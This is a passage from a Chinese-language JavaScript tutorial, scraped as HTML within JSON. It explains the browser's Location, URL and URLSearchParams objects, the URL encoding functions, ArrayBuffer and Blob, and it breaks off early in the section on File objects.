&quot;passwd&quot;\ndocument.location.origin\n// &quot;http://user:passwd@www.example.com:4097&quot;</code></pre><p>这些属性里面，只有<code>origin</code>属性是只读的，其他属性都可写。</p>\n<p>注意，如果对<code>Location.href</code>写入新的 URL 地址，浏览器会立刻跳转到这个新地址。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 跳转到新网址\ndocument.location.href = &#039;http://www.example.com&#039;;</code></pre><p>这个特性常常用于让网页自动滚动到新的锚点。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.location.href = &#039;#top&#039;;\n// 等同于\ndocument.location.hash = &#039;#top&#039;;</code></pre><p>直接改写<code>location</code>，相当于写入<code>href</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.location = &#039;http://www.example.com&#039;;\n// 等同于\ndocument.location.href = &#039;http://www.example.com&#039;;</code></pre><p>另外，<code>Location.href</code>属性是浏览器唯一允许跨域写入的属性，即非同源的窗口可以改写另一个窗口的<code>Location.href</code>属性，导致后者的网址跳转。<code>Location</code>的其他属性都不允许跨域写入。</p>\n\n        <h3>\n            <a href='#方法' class='header-anchor'>#</a>\n            <span>方法</span>\n        </h3>\n    <p><strong>（1）Location.assign()</strong></p>\n<p><code>assign</code>方法接受一个 URL 字符串作为参数，使得浏览器立刻跳转到新的 URL。如果参数不是有效的 URL 字符串，则会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 跳转到新的网址\ndocument.location.assign(&#039;http://www.example.com&#039;)</code></pre><p><strong>（2）Location.replace()</strong></p>\n<p><code>replace</code>方法接受一个 URL 字符串作为参数，使得浏览器立刻跳转到新的 URL。如果参数不是有效的 URL 字符串，则会报错。</p>\n<p>它与<code>assign</code>方法的差异在于，<code>replace</code>会在浏览器的浏览历史<code>History</code>里面删除当前网址，也就是说，一旦使用了该方法，后退按钮就无法回到当前网页了，相当于在浏览历史里面，使用新的 URL 替换了老的 URL。它的一个应用是，当脚本发现当前是移动设备时，就立刻跳转到移动版网页。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 跳转到新的网址\ndocument.location.replace(&#039;http://www.example.com&#039;)</code></pre><p><strong>（3）Location.reload()</strong></p>\n<p><code>reload</code>方法使得浏览器重新加载当前网址，相当于按下浏览器的刷新按钮。</p>\n<p>它接受一个布尔值作为参数。如果参数为<code>true</code>，浏览器将向服务器重新请求这个网页，并且重新加载后，网页将滚动到头部（即<code>scrollTop === 0</code>）。如果参数是<code>false</code>或为空，浏览器将从本地缓存重新加载该网页，并且重新加载后，网页的视口位置是重新加载前的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 向服务器重新请求当前网址\nwindow.location.reload(true);</code></pre><p><strong>（4）Location.toString()</strong></p>\n<p><code>toString</code>方法返回整个 URL 字符串，相当于读取<code>Location.href</code>属性。</p>\n\n        <h2>\n            <a href='#URL-的编码和解码' class='header-anchor'>#</a>\n            <span>URL 的编码和解码</span>\n        </h2>\n    <p>网页的 URL 只能包含合法的字符，这可以分成两类。</p>\n<ul>\n<li>URL 元字符：分号（<code>;</code>），逗号（&#39;,&#39;），斜杠（<code>/</code>），问号（<code>?</code>），冒号（<code>:</code>），at（<code>@</code>），<code>&amp;</code>，等号（<code>=</code>），加号（<code>+</code>），美元符号（<code>$</code>），井号（<code>#</code>）</li>\n<li>语义字符：<code>a-z</code>，<code>A-Z</code>，<code>0-9</code>，连词号（<code>-</code>），下划线（<code>_</code>），点（<code>.</code>），感叹号（<code>!</code>），波浪线（<code>~</code>），星号（<code>*</code>），单引号（<code>\\`</code>），圆括号（<code>()</code>）</li>\n</ul>\n<p>除了以上字符，其他字符出现在 URL 之中都必须转义，规则是根据操作系统的默认编码，将每个字节转为百分号（<code>%</code>）加上两个大写的十六进制字母。比如，UTF-8 的操作系统上，<code>http://www.example.com/q=春节</code>这个 URL 之中，汉字“春节”不是 URL 的合法字符，所以被浏览器自动转成<code>http://www.example.com/q=%E6%98%A5%E8%8A%82</code>。其中，“春”转成了<code>%E6%98%A5</code>，“节”转成了“%E8%8A%82”。这是因为“春”和”节“的 UTF-8 编码分别是<code>E6 98 A5</code>和<code>E8 8A 82</code>，将每个字节前面加上百分号，就构成了 URL 编码。</p>\n<p>JavaScript 提供四个 URL 的编码/解码方法。</p>\n<ul>\n<li><code>encodeURI()</code></li>\n<li><code>encodeURIComponent()</code></li>\n<li><code>decodeURI()</code></li>\n<li><code>decodeURIComponent()</code></li>\n</ul>\n\n        <h3>\n            <a href='#encodeURI()' class='header-anchor'>#</a>\n            <span>encodeURI()</span>\n        </h3>\n    <p><code>encodeURI()</code>方法用于转码整个 URL。它的参数是一个字符串，代表整个 URL。它会将元字符和语义字符之外的字符，都进行转义。</p>\n<pre class=\"prettyprint language-javascript\"><code>encodeURI(&#039;http://www.example.com/q=春节&#039;)\n// &quot;http://www.example.com/q=%E6%98%A5%E8%8A%82&quot;</code></pre>\n        <h3>\n            <a href='#encodeURIComponent()' class='header-anchor'>#</a>\n            <span>encodeURIComponent()</span>\n        </h3>\n    <p><code>encodeURIComponent()</code>方法用于转码 URL 的组成部分，会转码除了语义字符之外的所有字符，即元字符也会被转码。所以，它不能用于转码整个 URL。它接受一个参数，就是 URL 的片段。</p>\n<pre class=\"prettyprint language-javascript\"><code>encodeURIComponent(&#039;春节&#039;)\n// &quot;%E6%98%A5%E8%8A%82&quot;\nencodeURIComponent(&#039;http://www.example.com/q=春节&#039;)\n// &quot;http%3A%2F%2Fwww.example.com%2Fq%3D%E6%98%A5%E8%8A%82&quot;</code></pre><p>上面代码中，<code>encodeURIComponent()</code>会连 URL 元字符一起转义，所以如果转码整个 URL 就会出错。</p>\n\n        <h3>\n            <a href='#decodeURI()' class='header-anchor'>#</a>\n            <span>decodeURI()</span>\n        </h3>\n    <p><code>decodeURI()</code>方法用于整个 URL 的解码。它是<code>encodeURI()</code>方法的逆运算。它接受一个参数，就是转码后的 URL。</p>\n<pre class=\"prettyprint language-javascript\"><code>decodeURI(&#039;http://www.example.com/q=%E6%98%A5%E8%8A%82&#039;)\n// &quot;http://www.example.com/q=春节&quot;</code></pre>\n        <h3>\n            <a href='#decodeURIComponent()' class='header-anchor'>#</a>\n            <span>decodeURIComponent()</span>\n        </h3>\n    <p><code>decodeURIComponent()</code>用于URL 片段的解码。它是<code>encodeURIComponent()</code>方法的逆运算。它接受一个参数，就是转码后的 URL 片段。</p>\n<pre class=\"prettyprint language-javascript\"><code>decodeURIComponent(&#039;%E6%98%A5%E8%8A%82&#039;)\n// &quot;春节&quot;</code></pre>\n        <h2>\n            <a href='#URL-对象' class='header-anchor'>#</a>\n            <span>URL 对象</span>\n        </h2>\n    <p><code>URL</code>对象是浏览器的原生对象，可以用来构造、解析和编码 URL。一般情况下，通过<code>window.URL</code>可以拿到这个对象。</p>\n<p><code>&lt;a&gt;</code>元素和<code>&lt;area&gt;</code>元素都部署了这个接口。这就是说，它们的 DOM 节点对象可以使用 URL 的实例属性和方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = document.createElement(&#039;a&#039;);\na.href = &#039;http://example.com/?foo=1&#039;;\n\na.hostname // &quot;example.com&quot;\na.search // &quot;?foo=1&quot;</code></pre><p>上面代码中，<code>a</code>是<code>&lt;a&gt;</code>元素的 DOM 节点对象。可以在这个对象上使用 URL 的实例属性，比如<code>hostname</code>和<code>search</code>。</p>\n\n        <h3>\n            <a href='#构造函数' class='header-anchor'>#</a>\n            <span>构造函数</span>\n        </h3>\n    <p><code>URL</code>对象本身是一个构造函数，可以生成 URL 实例。</p>\n<p>它接受一个表示 URL 的字符串作为参数。如果参数不是合法的 URL，会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var url = new URL(&#039;http://www.example.com/index.html&#039;);\nurl.href\n// &quot;http://www.example.com/index.html&quot;</code></pre><p>如果参数是另一个 URL 实例，构造函数会自动读取该实例的<code>href</code>属性，作为实际参数。</p>\n<p>如果 URL 字符串是一个相对路径，那么需要表示绝对路径的第二个参数，作为计算基准。</p>\n<pre class=\"prettyprint language-javascript\"><code>var url1 = new URL(&#039;index.html&#039;, &#039;http://example.com&#039;);\nurl1.href\n// &quot;http://example.com/index.html&quot;\n\nvar url2 = new URL(&#039;page2.html&#039;, &#039;http://example.com/page1.html&#039;);\nurl2.href\n// &quot;http://example.com/page2.html&quot;\n\nvar url3 = new URL(&#039;..&#039;, &#039;http://example.com/a/b.html&#039;)\nurl3.href\n// &quot;http://example.com/&quot;</code></pre><p>上面代码中，返回的 URL 实例的路径都是在第二个参数的基础上，切换到第一个参数得到的。最后一个例子里面，第一个参数是<code>..</code>，表示上层路径。</p>\n\n        <h3>\n            <a href='#实例属性' class='header-anchor'>#</a>\n            <span>实例属性</span>\n        </h3>\n    <p>URL 实例的属性与<code>Location</code>对象的属性基本一致，返回当前 URL 的信息。</p>\n<ul>\n<li>URL.href：返回整个 URL</li>\n<li>URL.protocol：返回协议，以冒号<code>:</code>结尾</li>\n<li>URL.hostname：返回域名</li>\n<li>URL.host：返回域名与端口，包含<code>:</code>号，默认的80和443端口会省略</li>\n<li>URL.port：返回端口</li>\n<li>URL.origin：返回协议、域名和端口</li>\n<li>URL.pathname：返回路径，以斜杠<code>/</code>开头</li>\n<li>URL.search：返回查询字符串，以问号<code>?</code>开头</li>\n<li>URL.searchParams：返回一个<code>URLSearchParams</code>实例，该属性是<code>Location</code>对象没有的</li>\n<li>URL.hash：返回片段识别符，以井号<code>#</code>开头</li>\n<li>URL.password：返回域名前面的密码</li>\n<li>URL.username：返回域名前面的用户名</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var url = new URL(&#039;http://user:passwd@www.example.com:4097/path/a.html?x=111#part1&#039;);\n\nurl.href\n// &quot;http://user:passwd@www.example.com:4097/path/a.html?x=111#part1&quot;\nurl.protocol\n// &quot;http:&quot;\nurl.hostname\n// &quot;www.example.com&quot;\nurl.host\n// &quot;www.example.com:4097&quot;\nurl.port\n// &quot;4097&quot;\nurl.origin\n// &quot;http://www.example.com:4097&quot;\nurl.pathname\n// &quot;/path/a.html&quot;\nurl.search\n// &quot;?x=111&quot;\nurl.searchParams\n// URLSearchParams {}\nurl.hash\n// &quot;#part1&quot;\nurl.password\n// &quot;passwd&quot;\nurl.username\n// &quot;user&quot;</code></pre><p>这些属性里面，只有<code>origin</code>属性是只读的，其他属性都可写。</p>\n<pre class=\"prettyprint language-javascript\"><code>var url = new URL(&#039;http://example.com/index.html#part1&#039;);\n\nurl.pathname = &#039;index2.html&#039;;\nurl.href // &quot;http://example.com/index2.html#part1&quot;\n\nurl.hash = &#039;#part2&#039;;\nurl.href // &quot;http://example.com/index2.html#part2&quot;</code></pre><p>上面代码中，改变 URL 实例的<code>pathname</code>属性和<code>hash</code>属性，都会实时反映在 URL 实例当中。</p>\n\n        <h3>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h3>\n    <p><strong>（1）URL.createObjectURL()</strong></p>\n<p><code>URL.createObjectURL</code>方法用来为上传/下载的文件、流媒体文件生成一个 URL 字符串。这个字符串代表了<code>File</code>对象或<code>Blob</code>对象的 URL。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div id=&quot;display&quot;/&gt;\n// &lt;input\n//   type=&quot;file&quot;\n//   id=&quot;fileElem&quot;\n//   multiple\n//   accept=&quot;image/*&quot;\n//   onchange=&quot;handleFiles(this.files)&quot;\n//  &gt;\nvar div = document.getElementById(&#039;display&#039;);\n\nfunction handleFiles(files) {\n  for (var i = 0; i &lt; files.length; i++) {\n    var img = document.createElement(&#039;img&#039;);\n    img.src = window.URL.createObjectURL(files[i]);\n    div.appendChild(img);\n  }\n}</code></pre><p>上面代码中，<code>URL.createObjectURL</code>方法用来为上传的文件生成一个 URL 字符串，作为<code>&lt;img&gt;</code>元素的图片来源。</p>\n<p>该方法生成的 URL 就像下面的样子。</p>\n<pre class=\"prettyprint language-javascript\"><code>blob:http://localhost/c745ef73-ece9-46da-8f66-ebes574789b1</code></pre><p>注意，每次使用<code>URL.createObjectURL</code>方法，都会在内存里面生成一个 URL 实例。如果不再需要该方法生成的 URL 字符串，为了节省内存，可以使用<code>URL.revokeObjectURL()</code>方法释放这个实例。</p>\n<p><strong>（2）URL.revokeObjectURL()</strong></p>\n<p><code>URL.revokeObjectURL</code>方法用来释放<code>URL.createObjectURL</code>方法生成的 URL 实例。它的参数就是<code>URL.createObjectURL</code>方法返回的 URL 字符串。</p>\n<p>下面为上一段的示例加上<code>URL.revokeObjectURL()</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var div = document.getElementById(&#039;display&#039;);\n\nfunction handleFiles(files) {\n  for (var i = 0; i &lt; files.length; i++) {\n    var img = document.createElement(&#039;img&#039;);\n    img.src = window.URL.createObjectURL(files[i]);\n    div.appendChild(img);\n    img.onload = function() {\n      window.URL.revokeObjectURL(this.src);\n    }\n  }\n}</code></pre><p>上面代码中，一旦图片加载成功以后，为本地文件生成的 URL 字符串就没用了，于是可以在<code>img.onload</code>回调函数里面，通过<code>URL.revokeObjectURL</code>方法卸载这个 URL 实例。</p>\n\n        <h2>\n            <a href='#URLSearchParams-对象' class='header-anchor'>#</a>\n            <span>URLSearchParams 对象</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p><code>URLSearchParams</code>对象是浏览器的原生对象，用来构造、解析和处理 URL 的查询字符串（即 URL 问号后面的部分）。</p>\n<p>它本身也是一个构造函数，可以生成实例。参数可以为查询字符串，起首的问号<code>?</code>有没有都行，也可以是对应查询字符串的数组或对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 方法一：传入字符串\nvar params = new URLSearchParams(&#039;?foo=1&amp;bar=2&#039;);\n// 等同于\nvar params = new URLSearchParams(document.location.search);\n\n// 方法二：传入数组\nvar params = new URLSearchParams([[&#039;foo&#039;, 1], [&#039;bar&#039;, 2]]);\n\n// 方法三：传入对象\nvar params = new URLSearchParams({&#039;foo&#039; : 1 , &#039;bar&#039; : 2});</code></pre><p><code>URLSearchParams</code>会对查询字符串自动编码。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams({&#039;foo&#039;: &#039;你好&#039;});\nparams.toString() // &quot;foo=%E4%BD%A0%E5%A5%BD&quot;</code></pre><p>上面代码中，<code>foo</code>的值是汉字，<code>URLSearchParams</code>对其自动进行 URL 编码。</p>\n<p>浏览器向服务器发送表单数据时，可以直接使用<code>URLSearchParams</code>实例作为表单数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>const params = new URLSearchParams({foo: 1, bar: 2});\nfetch(&#039;https://example.com/api&#039;, {\n  method: &#039;POST&#039;,\n  body: params\n}).then(...)</code></pre><p>上面代码中，<code>fetch</code>命令向服务器发送命令时，可以直接使用<code>URLSearchParams</code>实例。</p>\n<p><code>URLSearchParams</code>可以与<code>URL</code>接口结合使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var url = new URL(window.location);\nvar foo = url.searchParams.get(&#039;foo&#039;) || &#039;somedefault&#039;;</code></pre><p>上面代码中，URL 实例的<code>searchParams</code>属性就是一个<code>URLSearchParams</code>实例，所以可以使用<code>URLSearchParams</code>接口的<code>get</code>方法。</p>\n<p>DOM 的<code>a</code>元素节点的<code>searchParams</code>属性，就是一个<code>URLSearchParams</code>实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = document.createElement(&#039;a&#039;);\na.href = &#039;https://example.com?filter=api&#039;;\na.searchParams.get(&#039;filter&#039;) // &quot;api&quot;</code></pre><p><code>URLSearchParams</code>实例有遍历器接口，可以用<code>for...of</code>循环遍历（详见《ES6 标准入门》的《Iterator》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams({&#039;foo&#039;: 1 , &#039;bar&#039;: 2});\n\nfor (var p of params) {\n  console.log(p[0] + &#039;: &#039; + p[1]);\n}\n// foo: 1\n// bar: 2</code></pre><p><code>URLSearchParams</code>没有实例属性，只有实例方法。</p>\n\n        <h3>\n            <a href='#URLSearchParams.toString()' class='header-anchor'>#</a>\n            <span>URLSearchParams.toString()</span>\n        </h3>\n    <p><code>toString</code>方法返回实例的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var url = new URL(&#039;https://example.com?foo=1&amp;bar=2&#039;);\nvar params = new URLSearchParams(url.search);\n\nparams.toString() // &quot;foo=1&amp;bar=2&#039;</code></pre><p>那么需要字符串的场合，会自动调用<code>toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams({version: 2.0});\nwindow.location.href = location.pathname + &#039;?&#039; + params;</code></pre><p>上面代码中，<code>location.href</code>赋值时，可以直接使用<code>params</code>对象。这时就会自动调用<code>toString</code>方法。</p>\n\n        <h3>\n            <a href='#URLSearchParams.append()' class='header-anchor'>#</a>\n            <span>URLSearchParams.append()</span>\n        </h3>\n    <p><code>append</code>方法用来追加一个查询参数。它接受两个参数，第一个为键名，第二个为键值，没有返回值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams({&#039;foo&#039;: 1 , &#039;bar&#039;: 2});\nparams.append(&#039;baz&#039;, 3);\nparams.toString() // &quot;foo=1&amp;bar=2&amp;baz=3&quot;</code></pre><p><code>append</code>方法不会识别是否键名已经存在。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams({&#039;foo&#039;: 1 , &#039;bar&#039;: 2});\nparams.append(&#039;foo&#039;, 3);\nparams.toString() // &quot;foo=1&amp;bar=2&amp;foo=3&quot;</code></pre><p>上面代码中，查询字符串里面<code>foo</code>已经存在了，但是<code>append</code>依然会追加一个同名键。</p>\n\n        <h3>\n            <a href='#URLSearchParams.delete()' class='header-anchor'>#</a>\n            <span>URLSearchParams.delete()</span>\n        </h3>\n    <p><code>delete</code>方法用来删除指定的查询参数。它接受键名作为参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams({&#039;foo&#039;: 1 , &#039;bar&#039;: 2});\nparams.delete(&#039;bar&#039;);\nparams.toString() // &quot;foo=1&quot;</code></pre>\n        <h3>\n            <a href='#URLSearchParams.has()' class='header-anchor'>#</a>\n            <span>URLSearchParams.has()</span>\n        </h3>\n    <p><code>has</code>方法返回一个布尔值，表示查询字符串是否包含指定的键名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams({&#039;foo&#039;: 1 , &#039;bar&#039;: 2});\nparams.has(&#039;bar&#039;) // true\nparams.has(&#039;baz&#039;) // false</code></pre>\n        <h3>\n            <a href='#URLSearchParams.set()' class='header-anchor'>#</a>\n            <span>URLSearchParams.set()</span>\n        </h3>\n    <p><code>set</code>方法用来设置查询字符串的键值。</p>\n<p>它接受两个参数，第一个是键名，第二个是键值。如果是已经存在的键，键值会被改写，否则会被追加。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams(&#039;?foo=1&#039;);\nparams.set(&#039;foo&#039;, 2);\nparams.toString() // &quot;foo=2&quot;\nparams.set(&#039;bar&#039;, 3);\nparams.toString() // &quot;foo=2&amp;bar=3&quot;</code></pre><p>上面代码中，<code>foo</code>是已经存在的键，<code>bar</code>是还不存在的键。</p>\n<p>如果有多个的同名键，<code>set</code>会移除现存所有的键。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams(&#039;?foo=1&amp;foo=2&#039;);\nparams.set(&#039;foo&#039;, 3);\nparams.toString() // &quot;foo=3&quot;</code></pre><p>下面是一个替换当前 URL 的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>// URL: https://example.com?version=1.0\nvar params = new URLSearchParams(location.search.slice(1));\nparams.set(&#039;version&#039;, 2.0);\n\nwindow.history.replaceState({}, &#039;&#039;, location.pathname + `?` + params);\n// URL: https://example.com?version=2.0</code></pre>\n        <h3>\n            <a href='#URLSearchParams.get()，URLSearchParams.getAll()' class='header-anchor'>#</a>\n            <span>URLSearchParams.get()，URLSearchParams.getAll()</span>\n        </h3>\n    <p><code>get</code>方法用来读取查询字符串里面的指定键。它接受键名作为参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams(&#039;?foo=1&#039;);\nparams.get(&#039;foo&#039;) // &quot;1&quot;\nparams.get(&#039;bar&#039;) // null</code></pre><p>两个地方需要注意。第一，它返回的是字符串，如果原始值是数值，需要转一下类型；第二，如果指定的键名不存在，返回值是<code>null</code>。</p>\n<p>如果有多个的同名键，<code>get</code>返回位置最前面的那个键值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams(&#039;?foo=3&amp;foo=2&amp;foo=1&#039;);\nparams.get(&#039;foo&#039;) // &quot;3&quot;</code></pre><p>上面代码中，查询字符串有三个<code>foo</code>键，<code>get</code>方法返回最前面的键值<code>3</code>。</p>\n<p><code>getAll</code>方法返回一个数组，成员是指定键的所有键值。它接受键名作为参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams(&#039;?foo=1&amp;foo=2&#039;);\nparams.getAll(&#039;foo&#039;) // [&quot;1&quot;, &quot;2&quot;]</code></pre><p>上面代码中，查询字符串有两个<code>foo</code>键，<code>getAll</code>返回的数组就有两个成员。</p>\n\n        <h3>\n            <a href='#URLSearchParams.sort()' class='header-anchor'>#</a>\n            <span>URLSearchParams.sort()</span>\n        </h3>\n    <p><code>sort</code>方法对查询字符串里面的键进行排序，规则是按照 Unicode 码点从小到大排列。</p>\n<p>该方法没有返回值，或者说返回值是<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams(&#039;c=4&amp;a=2&amp;b=3&amp;a=1&#039;);\nparams.sort();\nparams.toString() // &quot;a=2&amp;a=1&amp;b=3&amp;c=4&quot;</code></pre><p>上面代码中，如果有两个同名的键<code>a</code>，它们之间不会排序，而是保留原始的顺序。</p>\n\n        <h3>\n            <a href='#URLSearchParams.keys()，URLSearchParams.values()，URLSearchParams.entries()' class='header-anchor'>#</a>\n            <span>URLSearchParams.keys()，URLSearchParams.values()，URLSearchParams.entries()</span>\n        </h3>\n    <p>这三个方法都返回一个遍历器对象，供<code>for...of</code>循环消费。它们的区别在于，<code>keys</code>方法返回的是键名的遍历器，<code>values</code>方法返回的是键值的遍历器，<code>entries</code>返回的是键值的遍历器。</p>\n<pre class=\"prettyprint language-javascript\"><code>var params = new URLSearchParams(&#039;a=1&amp;b=2&#039;);\n\nfor(var p of params.keys()) {\n  console.log(p);\n}\n// a\n// b\n\nfor(var p of params.values()) {\n  console.log(p);\n}\n// 1\n// 2\n\nfor(var p of params.entries()) {\n  console.log(p);\n}\n// [&quot;a&quot;, &quot;1&quot;]\n// [&quot;b&quot;, &quot;2&quot;]</code></pre><p>如果直接对<code>URLSearchParams</code>进行遍历，其实内部调用的就是<code>entries</code>接口。</p>\n<pre class=\"prettyprint language-javascript\"><code>for (var p of params) {}\n// 等同于\nfor (var p of params.entries()) {}</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Location\">Location</a>, by MDN</li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/URL\">URL</a>, by MDN</li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams\">URLSearchParams</a>, by MDN</li>\n<li><a href=\"https://developers.google.com/web/updates/2016/01/urlsearchparams?hl=en\">Easy URL Manipulation with URLSearchParams</a>, by Eric Bidelman</li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"ArrayBuffer 对象，Blob 对象","link":"/bom/arraybuffer.html"}],"content":"\n        <h1>\n            <a href='#ArrayBuffer-对象，Blob-对象' class='header-anchor'>#</a>\n            <span>ArrayBuffer 对象，Blob 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#ArrayBuffer-对象' class='header-anchor'>#</a>\n            <span>ArrayBuffer 对象</span>\n        </h2>\n    <p>ArrayBuffer 对象表示一段二进制数据，用来模拟内存里面的数据。通过这个对象，JavaScript 可以读写二进制数据。</p>\n<p>这个对象是 ES6 才写入标准的，普通的网页编程用不到它，为了教程体系的完整，下面只提供一个简略的介绍，详细介绍请看《ES6 标准入门》里面的章节。</p>\n<p>浏览器原生提供<code>ArrayBuffer()</code>构造函数，用来生成实例。它接受一个整数作为参数，表示这段二进制数据占用多少个字节。</p>\n<pre class=\"prettyprint language-javascript\"><code>var buffer = new ArrayBuffer(8);</code></pre><p>上面代码中，实例对象<code>buffer</code>占用8个字节。</p>\n<p>ArrayBuffer 对象有实例属性<code>length</code>和<code>byteLength</code>，都表示当前实例占用的内存长度（单位字节）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var buffer = new ArrayBuffer(8);\nbuffer.length // 8\nbuffer.length // 8</code></pre><p>ArrayBuffer 对象有实例方法<code>slice()</code>，用来复制一部分内存。它接受两个整数参数，分别表示复制的开始位置（从0开始）和结束位置（复制时不包括结束位置），如果省略第二个参数，则表示一直复制到结束。</p>\n<pre class=\"prettyprint language-javascript\"><code>var buf1 = new ArrayBuffer(8);\nvar buf2 = buf1.slice(0);</code></pre><p>上面代码表示复制原来的实例。</p>\n\n        <h2>\n            <a href='#Blob-对象' class='header-anchor'>#</a>\n            <span>Blob 对象</span>\n        </h2>\n    <p>Blob 对象表示一个二进制文件的数据内容，比如一个图片文件的内容就可以通过 Blob 对象读写。它通常用来读写文件。</p>\n<p>浏览器原生提供<code>Blob()</code>构造函数，用来生成实例对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Blob(array [, options])</code></pre><p><code>Blob</code>构造函数接受两个参数。第一个参数是数组，成员是字符串或二进制对象，表示新生成的<code>Blob</code>实例对象的内容；第二个参数是可选的，是一个配置对象，目前只有一个属性<code>type</code>，它的值是一个字符串，表示数据的 MIME 类型，默认是空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var htmlFragment = [&#039;&lt;a id=&quot;a&quot;&gt;&lt;b id=&quot;b&quot;&gt;hey!&lt;/b&gt;&lt;/a&gt;&#039;];\nvar myBlob = new Blob(htmlFragment, {type : &#039;text/html&#039;});</code></pre><p>上面代码中，实例对象<code>myBlob</code>包含的是字符串。生成实例的时候，数据类型指定为<code>text/html</code>。</p>\n<p>下面是另一个例子，Blob 保存 JSON 数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { hello: &#039;world&#039; };\nvar blob = new Blob([ JSON.stringify(obj) ], {type : &#039;application/json&#039;});</code></pre><p><code>Blob</code>具有两个实例属性<code>size</code>和<code>type</code>，分别返回数据的大小和类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>var htmlFragment = [&#039;&lt;a id=&quot;a&quot;&gt;&lt;b id=&quot;b&quot;&gt;hey!&lt;/b&gt;&lt;/a&gt;&#039;];\nvar myBlob = new Blob(htmlFragment, {type : &#039;text/html&#039;});\n\nmyBlob.size // 32\nmyBlob.type // &quot;text/html&quot;</code></pre><p><code>Blob</code>具有一个实例方法<code>slice</code>，用来拷贝原来的数据，返回的也是一个<code>Blob</code>实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>myBlob.slice(start，end, contentType)</code></pre><p><code>slice</code>方法有三个参数，都是可选的。它们依次是起始的字节位置（默认为0）、结束的字节位置（默认为<code>size</code>属性的值，该位置本身将不包含在拷贝的数据之中）、新实例的数据类型（默认为空字符串）。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"File 对象，FileList 对象，FileReader 对象","link":"/bom/file.html"}],"content":"\n        <h1>\n            <a href='#File-对象，FileList-对象，FileReader-对象' class='header-anchor'>#</a>\n            <span>File 对象，FileList 对象，FileReader 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#File-对象' class='header-anchor'>#</a>\n            <span>File 对象</span>\n        </h2>\n    <p>File 对象代表一个文件，用来读写文件信息。它继承了 Blob 对象，或者说是一种特殊的 Blob 对象，所有可以使用 Blob 对象的场合都可以使用它。</p>\n<p>最常见的使用场合是表单的文件上传控件（<code>&lt;input type=&quot;file&quot;&gt;</code>），用户选中文件以后，浏览器就会生成一个数组，里面是每一个用户选中的文件，它们都是 File 实例对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;input id=&quot;fileItem&quot; type=&quot;file&quot;&gt;\nvar file = document.getElementById(&#039;fileItem&#039;).files[0];\nfile instanceof File // true</code></pre><p>上面代码中，<code>file</code>是用户选中的第一个文件，它是 File 的实例。</p>\n\n        <h3>\n            <a href='#构造函数' class='header-anchor'>#</a>\n            <span>构造函数</span>\n        </h3>\n    <p>浏览器原生提供一个<code>File()</code>构造函数，用来生成 File 实例对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>new File(array, name [, options])</code></pre><p><code>File()</code>构造函数接受三个参数。</p>\n<ul>\n<li>array：一个数组，成员可以是二进制对象或字符串，表示文件的内容。</li>\n<li>name：字符串，表示文件名或文件路径。</li>\n<li>options：配置对象，设置实例的属性。该参数可选。</li>\n</ul>\n<p>第三个参数配置对象，可以设置两个属性。</p>\n<ul>\n<li>type：字符串，表示实例对象的 MIME 类型，默认值为空字符串。</li>\n<li>lastModified：时间戳，表示上次修改的时间，默认为<code>Date.now()</code>。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var file = new File(\n  [&#039;foo&#039;],\n  &#039;foo.txt&#039;,\n  {\n    type: &#039;text/plain&#039;,\n  }\n);</code></pre>\n        <h3>\n            <a href='#实例属性和实例方法' class='header-anchor'>#</a>\n            